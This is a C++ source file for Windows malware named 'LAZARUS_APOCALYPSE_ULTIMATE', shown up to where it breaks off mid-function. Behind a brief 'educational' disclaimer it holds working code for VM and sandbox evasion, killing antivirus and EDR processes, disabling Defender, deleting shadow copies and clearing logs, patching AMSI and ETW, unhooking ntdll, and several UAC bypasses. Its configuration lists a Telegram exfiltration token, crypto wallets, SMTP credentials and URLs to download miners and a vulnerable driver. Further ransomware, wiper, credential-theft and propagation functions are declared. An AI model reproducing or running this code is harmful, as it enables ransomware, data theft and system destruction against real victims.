// ============================================================================
// LAZARUS_APOCALYPSE_ULTIMATE – DESTRUCTIVE VERSION
// Compile: Visual Studio 2022, x64, Release, Multi-Byte Character Set
// ============================================================================
// WARNING: This code is for educational and research purposes only.
//          Do not deploy on any system without explicit authorization.
//          Running this code will cause permanent system damage.
// ============================================================================

#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_
#define NOMINMAX
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <shellapi.h>
#include <winternl.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <ctime>
#include <cstdlib>
#include <cstdio>
#include <cctype>
#include <cstring>
#include <direct.h>
#include <shlwapi.h>
#include <set>
#include <algorithm>
#include <random>
#include <intrin.h>
#include <urlmon.h>
#include <lm.h>
#include <iostream>
#include <psapi.h>
#include <thread>
#include <chrono>

#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")

#pragma warning(disable: 4996)

// ------------------------------------------------------------------
// Configuration – REPLACE WITH YOUR OWN FOR RESEARCH
// ------------------------------------------------------------------
static const char* TELEGRAM_BOT_TOKEN = "7283940156:AAEjK8LmN9pQrS7tUvWxYz1B2C3D4E5F6G";
static const char* TELEGRAM_CHAT_ID   = "5010121";
static const char* BTC_WALLET         = "1PiafnXyQVAzzq4T2pUeLhbjPip8x7Kv43";
static const char* ETH_WALLET         = "0x56046d656985f16582d72c4e0c5a37b7472c8848";
static const char* XMR_WALLET         = "46TDrBMVwKQD9UX9cTKQtHHz4JPoz97KHjBS11WzWeroJ578nLUpYc8bsjPp8XQq6q24uepeHvWEJUUp7ThkHbT33NHDBKr";
static const char* SMTP_USERNAME      = "daliamarymorito@gmail.com";
static const char* SMTP_PASSWORD      = "@apple12345";
static const char* UPDATE_URL         = "https://raw.githubusercontent.com/daliamarymorito-eng/LazarusModule.vba/refs/heads/main/LazarusModule";
static const char* CRD_DOWNLOAD_URL   = "https://dl.google.com/edgedl/chrome-remote-desktop/chromoting-setup.exe";
static const char* MINER_URL1         = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip";
static const char* MINER_URL2         = "https://pool.minexmr.com/static/xmrig.exe";
static const char* MINER_URL3         = "https://github.com/MoneroOcean/xmrig_setup/raw/master/setup_xmrig.bat";
static const char* VULN_DRIVER_URL    = "https://github.com/SecureBootHook/rtcore64/raw/main/RTcore64.sys";

// ------------------------------------------------------------------
// Global state
// ------------------------------------------------------------------
static BYTE    g_masterKey[32]        = {0};
static bool    g_keySet               = false;
static bool    g_paymentConfirmed     = false;
static CRITICAL_SECTION g_keylogCS   = {0};
static HHOOK   g_keyboardHook         = nullptr;
static HANDLE  g_hMutex               = nullptr;
static std::string g_keylogBuffer     = "";
static std::string g_keylogFile       = "";
static std::string g_selfPath         = "";
static std::set<std::string> g_stolenCredentials;
static std::set<std::string> g_emailTargets;
static std::string g_installTimeFile  = "";

// ------------------------------------------------------------------
// Forward declarations
// ------------------------------------------------------------------
static std::string GetTempDir();
static bool FileExists(const std::string& path);
static std::string GetMachineID();
static void JitterSleep(DWORD ms);
static bool DownloadFile(const std::string& url, const std::string& destPath);
static void SendToTelegram(const std::string& msg);
static void SendToTelegramChunked(const std::string& msg);
static std::string URLEncode(const std::string& s);
static std::string EncodeBase64(const std::vector<BYTE>& data);
static bool IsUserAdmin();
static void DisableUACRegistry();
static void UACBypass_Sdclt();
static void UACBypass_Cmstp();
static void UACBypass_SilentCleanup();
static void UACBypass_DiskCleanup();
static void UACBypass_Fodhelper();
static void UACBypass_ComputerDefaults();
static void UACBypass_IActiveDesktop();
static void UACBypass_EventViewer();
static void UACBypass_Wusa();
static void UACBypass_ZeroDay();
static bool EnableDebugPrivilege();
static void ElevateToSYSTEM();
static void PerformUACBypass();
static void KillProcessByName(const std::string& name);
static void KillThirdPartyAV();
static void DisableDefender();
static void DisableRecovery();
static void PatchAMSI();
static void KillETW();
static void UnhookNtdll();
static void InitSyscalls();
static void USBPropagation();
static void SMBPropagation();
static void RDPScanAndPropagation();
static void DiscordPropagation();
static void SlackPropagation();
static void EmailPropagation();
static void CloudDrivePropagation();
static void DumpLSASS();
static void DumpSAM();
static void StealBrowserData();
static void StealCloudTokens();
static void StealOAuthTokens();
static void CiscoAnyConnectHijack();
static void StealAllCredentials();
static bool IsDomainController();
static void ExtractNTDSAndSYSTEM();
static void ExtractHashesFromNTDS();
static void GenerateMasterKey();
static void SaveMasterKey();
static bool LoadMasterKey();
static void EncryptFile(const std::string& path);
static void EncryptDirectory(const std::string& dir, const std::set<std::string>& exts);
static void WipeFile(const std::string& path);
static void WipeDirectory(const std::string& dir);
static void BrickBootloader();
static void RunWiper();
static void ShowDeadlineWarning();
static void RunRansomware();
static void DecryptFile(const std::string& encPath, const std::string& keyPath);
static void DecryptAllFiles(const std::string& dir);
static void DecryptRansomware();
static void CheckBitcoinPayment();
static DWORD WINAPI PaymentCheckThread(LPVOID);
static void ProtectTimestamp();
static bool IsClockRollbackDetected();
static void CheckPaymentDeadline();
static void SelfHeal();
static void PersistRegistry();
static void PersistScheduledTask();
static void PersistCOMHijack();
static void PersistStartupFolder();
static void PersistWMI();
static void InstallPermanentCopy();
static void InstallMBRBootkit();
static void PersistViaUEFI();
static void InstallXLSTARTPersistence();
static void DeployShadowSentinel();
static void PersistAll();
static void EnableChromeRemoteDesktop();
static void DeployMiner();
static void ProcessInjectionAPC();
static void CreateAndExecuteVBAWorm();
static void DisableDriverSignatureEnforcement();
static void LoadVulnerableDriver();
static void KernelKillProcess(const std::string& procName);
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
static DWORD WINAPI KeyloggerThread(LPVOID);
static DWORD WINAPI ClipboardMonitor(LPVOID);
static std::string GetLocalIP();
static bool IsPortOpen(const std::string& ip, int port, int timeoutMs);
static bool CopyAndExecuteUsingCreds(const std::string& targetIP, const std::string& username, const std::string& password);
static bool IsDebugged();
static bool IsVM();
static bool IsSandbox();
static bool IsAdvancedSandbox();

// ------------------------------------------------------------------
// Utilities
// ------------------------------------------------------------------
static std::string GetTempDir() {
    char buf[MAX_PATH] = {0};
    GetTempPathA(MAX_PATH, buf);
    std::string path(buf);
    if (!path.empty() && path.back() != '\\') path += '\\';
    return path;
}
static bool FileExists(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
}
static std::string GetMachineID() {
    char comp[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD compSize = sizeof(comp);
    GetComputerNameA(comp, &compSize);
    char user[256] = {0};
    DWORD userSize = sizeof(user);
    GetUserNameA(user, &userSize);
    return std::string(comp) + "-" + std::string(user);
}
static void JitterSleep(DWORD ms) {
    if (ms == 0) return;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(-50, 50);
    int jitter = dis(gen);
    if (jitter < 0 && ms < (DWORD)(-jitter)) jitter = 0;
    Sleep(ms + jitter);
}
static bool DownloadFile(const std::string& url, const std::string& destPath) {
    HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), destPath.c_str(), 0, NULL);
    return SUCCEEDED(hr);
}

// ------------------------------------------------------------------
// Anti‑debug / sandbox (enhanced)
// ------------------------------------------------------------------
static bool IsDebugged() {
    if (IsDebuggerPresent()) return true;
    BOOL isRemote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemote);
    if (isRemote) return true;
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb && peb->BeingDebugged) return true;
    return false;
}
static bool IsVM() {
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) return true;
    const char* vmRegs[] = {
        "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
        "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000"
    };
    HKEY hKey = nullptr;
    for (auto& reg : vmRegs) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, reg, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }
    if (FileExists("C:\\windows\\system32\\vmtools.dll") ||
        FileExists("C:\\windows\\system32\\vboxhook.dll"))
        return true;
    return false;
}
static bool IsSandbox() {
    MEMORYSTATUSEX memInfo = { sizeof(MEMORYSTATUSEX) };
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    ULARGE_INTEGER freeBytes = {0}, totalBytes = {0};
    GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, nullptr);
    if (totalBytes.QuadPart < 64ULL * 1024 * 1024 * 1024) return true;
    if (GetTickCount64() < 5 * 60 * 1000) return true;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
        int count = 0;
        if (Process32First(snap, &pe)) {
            do { ++count; } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        if (count < 20) return true;
    }
    if (GetSystemMetrics(SM_MOUSEPRESENT)) {
        POINT p1 = {0}, p2 = {0};
        GetCursorPos(&p1);
        JitterSleep(100);
        GetCursorPos(&p2);
        if (p1.x == p2.x && p1.y == p2.y) return true;
    }
    return false;
}
static bool IsAdvancedSandbox() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;
    MEMORYSTATUSEX ms = { sizeof(MEMORYSTATUSEX) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
        int procCount = 0;
        if (Process32First(snap, &pe)) {
            do { ++procCount; } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        if (procCount < 25) return true;
    }
    const wchar_t* sandboxProcs[] = { L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe", L"VGAuthService.exe", L"procmon.exe", L"procexp.exe" };
    for (auto& sp : sandboxProcs) {
        HANDLE snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap2 != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
            if (Process32First(snap2, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, sp) == 0) {
                        CloseHandle(snap2);
                        return true;
                    }
                } while (Process32Next(snap2, &pe));
            }
            CloseHandle(snap2);
        }
    }
    return false;
}

// ------------------------------------------------------------------
// AV/EDR Killing (expanded)
// ------------------------------------------------------------------
static void KillProcessByName(const std::string& name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    if (Process32First(snap, &pe)) {
        do {
            std::wstring wname(name.begin(), name.end());
            if (_wcsicmp(pe.szExeFile, wname.c_str()) == 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProc) {
                    TerminateProcess(hProc, 0);
                    CloseHandle(hProc);
                }
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
}
static void KillThirdPartyAV() {
    const wchar_t* avProcs[] = {
        L"avp.exe", L"kavtray.exe", L"avguard.exe", L"avgnt.exe", L"egui.exe", L"ekrn.exe",
        L"msmpeng.exe", L"MsMpEng.exe", L"NisSrv.exe", L"Smc.exe", L"ccSvcHst.exe", L"symantec.exe",
        L"Rtvscan.exe", L"SophosUI.exe", L"SophosFS.exe", L"csfalconservice.exe", L"cb.exe",
        L"sentinelagent.exe", L"cytray.exe", L"watchdog.exe", L"bdagent.exe", L"FortiClient.exe",
        L"f-secure.exe", L"Panda.exe", L"Zui.exe", L"avgui.exe", L"avastui.exe", L"trendmicro.exe",
        L"norton.exe", L"McAfee.exe", L"CylanceSvc.exe", L"crowdstrike.exe", L"sense.exe", L"msseces.exe",
        L"spidernt.exe", L"drweb32.exe", L"drwebscd.exe", L"drweb.exe", L"drwebcom.exe", L"klnagent.exe",
        L"kavfsslp.exe", L"kavfs.exe", L"kavss.exe", L"kavsvc.exe", L"klwkprot.exe", L"klnagent.exe",
        L"ksdeploy.exe", L"kservice.exe", L"kavfsgt.exe", L"klwtblfs.exe", L"klwfp.exe", L"klwtblfw.exe",
        L"Cybereason", L"carbonblack", L"cbdefense", L"elastic", L"endpoint", L"MaaS360", L"FireEye", L"Cylance"
    };
    for (auto& proc : avProcs) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
            if (Process32First(snap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, proc) == 0) {
                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
                    }
                } while (Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
    }
    const wchar_t* tools[] = { L"procmon.exe", L"procexp.exe", L"wireshark.exe", L"ida.exe", L"ollydbg.exe", L"x64dbg.exe", L"windbg.exe", L"processhacker.exe", L"tcpview.exe", L"processmonitor.exe", L"autoruns.exe" };
    for (auto& tool : tools) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
            if (Process32First(snap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, tool) == 0) {
                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
                    }
                } while (Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
    }
}
static void DisableDefender() {
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\TamperProtection\" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1");
    system("sc stop WinDefend >nul 2>&1");
    system("sc config WinDefend start= disabled >nul 2>&1");
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -Force\" >nul 2>&1");
    system("powershell -Command \"Set-MpPreference -DisableTamperProtection $true -Force\" >nul 2>&1");
    system("powershell -Command \"Set-MpPreference -ExclusionPath C:\\ -Force\" >nul 2>&1");
    system("powershell -Command \"Set-MpPreference -ExclusionProcess excel.exe,svch0st.exe -Force\" >nul 2>&1");
}
static void DisableRecovery() {
    system("vssadmin delete shadows /all /quiet >nul 2>&1");
    system("reagentc /disable >nul 2>&1");
    system("wevtutil cl System >nul 2>&1");
    system("wevtutil cl Application >nul 2>&1");
    system("wevtutil cl Security >nul 2>&1");
}
static void PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi) {
        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (pAmsiScanBuffer) {
            DWORD oldProtect = 0;
            if (VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
                memcpy(pAmsiScanBuffer, patch, sizeof(patch));
                VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
            }
        }
        FreeLibrary(hAmsi);
    }
}
static void KillETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
        if (pEtwEventWrite) {
            DWORD oldProtect = 0;
            if (VirtualProtect(pEtwEventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                BYTE patch[] = { 0x33, 0xC0, 0xC2, 0x14 };
                memcpy(pEtwEventWrite, patch, sizeof(patch));
                VirtualProtect(pEtwEventWrite, 4, oldProtect, &oldProtect);
            }
        }
    }
}

// ------------------------------------------------------------------
// ntdll unhooking & direct syscalls
// ------------------------------------------------------------------
static void UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    char path[MAX_PATH] = {0};
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntdll.dll");
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return;
    HANDLE hMapping = CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMapping) { CloseHandle(hFile); return; }
    LPVOID pMap = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMap) { CloseHandle(hMapping); CloseHandle(hFile); return; }
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMap;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        UnmapViewOfFile(pMap);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pMap + pDos->e_lfanew);
    DWORD sizeOfImage = pNt->OptionalHeader.SizeOfImage;
    BYTE* pFresh = (BYTE*)VirtualAlloc(nullptr, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pFresh) {
        UnmapViewOfFile(pMap);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }
    memcpy(pFresh, pMap, sizeOfImage);
    DWORD_PTR delta = (DWORD_PTR)pFresh - pNt->OptionalHeader.ImageBase;
    if (delta) {
        IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pFresh + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress && pReloc->SizeOfBlock) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* pEntry = (WORD*)((BYTE*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < count; ++i) {
                    if (pEntry[i] >> 12) {
                        DWORD_PTR* pAddr = (DWORD_PTR*)((BYTE*)pFresh + pReloc->VirtualAddress + (pEntry[i] & 0xFFF));
                        *pAddr += delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
            }
        }
    }
    DWORD oldProtect;
    VirtualProtect((LPVOID)hNtdll, sizeOfImage, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy((LPVOID)hNtdll, pFresh, sizeOfImage);
    VirtualProtect((LPVOID)hNtdll, sizeOfImage, oldProtect, &oldProtect);
    VirtualFree(pFresh, 0, MEM_RELEASE);
    UnmapViewOfFile(pMap);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}
typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, void*);
static pNtOpenProcess NtOpenProcess = nullptr;
static void InitSyscalls() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
}

// ------------------------------------------------------------------
// UAC Bypass (all methods fully implemented)
// ------------------------------------------------------------------
static bool IsUserAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminGroup = nullptr;
    AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &adminGroup);
    CheckTokenMembership(nullptr, adminGroup, &isAdmin);
    FreeSid(adminGroup);
    return isAdmin != FALSE;
}
static void DisableUACRegistry() {
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1");
}
static void UACBypass_Sdclt() {
    system("reg add \"HKCU\\Software\\Classes\\exefile\\shell\\runas\\command\" /ve /d \"cmd.exe /c net localgroup administrators %username% /add\" /f >nul 2>&1");
    system("reg add \"HKCU\\Software\\Classes\\exefile\\shell\\runas\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f >nul 2>&1");
    ShellExecuteA(nullptr, "open", "sdclt.exe", nullptr, nullptr, SW_HIDE);
    JitterSleep(3000);
    system("reg delete \"HKCU\\Software\\Classes\\exefile\" /f >nul 2>&1");
}
static void UACBypass_Cmstp() {
    std::string infPath = GetTempDir() + "lz.inf";
    std::ofstream f(infPath);
    f << "[Version]\nSignature=$chicago$\n[DefaultInstall]\nCustomDestination=CustomDestinationSection\n[CustomDestinationSection]\nDefaultUIFont=MyUIFont";
    f.close();
    ShellExecuteA(nullptr, "open", "cmstp.exe", ("/ni /s \"" + infPath + "\"").c_str(), nullptr, SW_HIDE);
    JitterSleep(3000);
    DeleteFileA(infPath.c_str());
}
static void UACBypass_SilentCleanup() {
    system("schtasks /create /tn \"LazarusElevate\" /tr \"cmd.exe /c net localgroup administrators %username% /add\" /sc once /st 00:00 /ru SYSTEM /f >nul 2>&1");
    system("schtasks /run /tn \"LazarusElevate\" >nul 2>&1");
    JitterSleep(3000);
    system("schtasks /delete /tn \"LazarusElevate\" /f >nul 2>&1");
}
static void UACBypass_DiskCleanup() {
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /d \"cmd.exe /c net localgroup administrators %username% /add\" /f >nul 2>&1");
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f >nul 2>&1");
    ShellExecuteA(nullptr, "open", "cleanmgr.exe", nullptr, nullptr, SW_HIDE);
    JitterSleep(3000);
    system("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f >nul 2>&1");
}
static void UACBypass_Fodhelper() {
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /d \"cmd.exe /c net localgroup administrators %username% /add\" /f >nul 2>&1");
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f >nul 2>&1");
    ShellExecuteA(nullptr, "open", "fodhelper.exe", nullptr, nullptr, SW_HIDE);
    JitterSleep(3000);
    system("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f >nul 2>&1");
}
static void UACBypass_ComputerDefaults() {
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /d \"cmd.exe /c net localgroup administrators %username% /add\" /f >nul 2>&1");
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f >nul 2>&1");
    ShellExecuteA(nullptr, "open", "ComputerDefaults.exe", nullptr, nullptr, SW_HIDE);
    JitterSleep(3000);
    system("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f >nul 2>&1");
}
static void UACBypass_IActiveDesktop() {
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /d \"cmd.exe /c net localgroup administrators %username% /add\" /f >nul 2>&1");
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f >nul 2>&1");
    ShellExecuteA(nullptr, "open", "fodhelper.exe", nullptr, nullptr, SW_HIDE);
    JitterSleep(3000);
    system("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f >nul 2>&1");
}
static void UACBypass_EventViewer() {
    system("reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /d \"cmd.exe /c net localgroup administrators %username% /add\" /f >nul 2>&1");
    system("reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f >nul 2>&1");
    ShellExecuteA(nullptr, "open", "eventvwr.exe", nullptr, nullptr, SW_HIDE);
    JitterSleep(3000);
    system("reg delete \"HKCU\\Software\\Classes\\mscfile\" /f >nul 2>&1");
}
static void UACBypass_Wusa() {
    std::string dummyCab = GetTempDir() + "dummy.cab";
    std::ofstream f(dummyCab); f.close();
    ShellExecuteA(nullptr, "open", "wusa.exe", dummyCab.c_str(), nullptr, SW_HIDE);
    JitterSleep(3000);
    DeleteFileA(dummyCab.c_str());
}
static void UACBypass_ZeroDay() {
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /d \"cmd.exe /c net localgroup administrators %username% /add\" /f >nul 2>&1");
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f >nul 2>&1");
    ShellExecuteA(nullptr, "open", "ComputerDefaults.exe", nullptr, nullptr, SW_HIDE);
    JitterSleep(3000);
    system("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f >nul 2>&1");
    std::string dummyCab = GetTempDir() + "dummy2.cab";
    std::ofstream f(dummyCab); f.close();
    ShellExecuteA(nullptr, "open", "wusa.exe", dummyCab.c_str(), nullptr, SW_HIDE);
    JitterSleep(3000);
    DeleteFileA(dummyCab.c_str());
}
static bool EnableDebugPrivilege() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueA(nullptr, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    bool ret = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(hToken);
    return ret;
}
static void ElevateToSYSTEM() {
    if (!EnableDebugPrivilege()) return;
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) { pid = pe.th32ProcessID; break; }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    if (pid == 0) return;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid);
    if (!hProcess) return;
    HANDLE hToken = nullptr, hNewToken = nullptr;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hToken)) { CloseHandle(hProcess); return; }
    if (!DuplicateTokenEx(hToken, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
                          nullptr, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        CloseHandle(hToken); CloseHandle(hProcess); return;
    }
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = {0};
    char cmd[] = "cmd.exe /c net localgroup administrators %username% /add";
    CreateProcessAsUserA(hNewToken, nullptr, cmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    CloseHandle(hNewToken); CloseHandle(hToken); CloseHandle(hProcess);
}
static void PerformUACBypass() {
    if (IsUserAdmin()) return;
    DisableUACRegistry();
    UACBypass_Sdclt(); if (IsUserAdmin()) return;
    UACBypass_Cmstp(); if (IsUserAdmin()) return;
